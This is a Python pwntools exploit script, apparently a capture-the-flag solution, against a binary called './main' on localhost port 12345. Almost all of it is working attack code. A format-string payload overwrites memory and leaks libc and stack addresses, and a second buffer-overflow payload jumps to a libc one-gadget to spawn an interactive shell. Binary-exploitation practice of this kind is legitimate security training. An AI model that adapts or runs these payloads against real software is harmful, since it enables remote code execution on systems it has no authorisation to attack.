#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 12345 ./main
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./main')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'localhost'
port = int(args.PORT or 12345)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
# b *0x00000000004012ed
# b *0x000000000040134c
b *0x0000000000401364
continue
c
# c
# c

'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

def make_offset(addr, length=1):
    len_format = 2**(length*8)-1
    offset = []

    for i in range(int(8/length)):
       tmp = addr & len_format
       offset.append(tmp)
       addr >>= len_format.bit_length() 

    return offset

libc =exe.libc

sl_addr = make_offset(u16('90'),2)

p = ''
p += '%{}C%25$hn'.format(sl_addr[0])
p += '-%53$lX-%55$lX'
p = p.ljust(56, '\x00')
p += p64(0x404091) 

io.sendlineafter("input>",p)

io.recvuntil('-')

data = io.recvline()[:-1].split('-')
libc.address = int(data[0],16) -231 - libc.sym['__libc_start_main']
stack = int(data[1],16)
print hex(libc.address)
print hex(stack)
print hex(libc.sym['system'])
to_stack = stack - 0x260

p ='a'*(320-8*5)
p += p64(libc.address + 0x4f2a5)
# p += p64(0x00000000004013d3+1)
# p += p64(0x00000000004013d3)
# p += p64(libc.search("/bin/sh\x00").next())
# p += p64(libc.sym['system']+3)
io.sendlineafter("input>",p)

io.interactive()

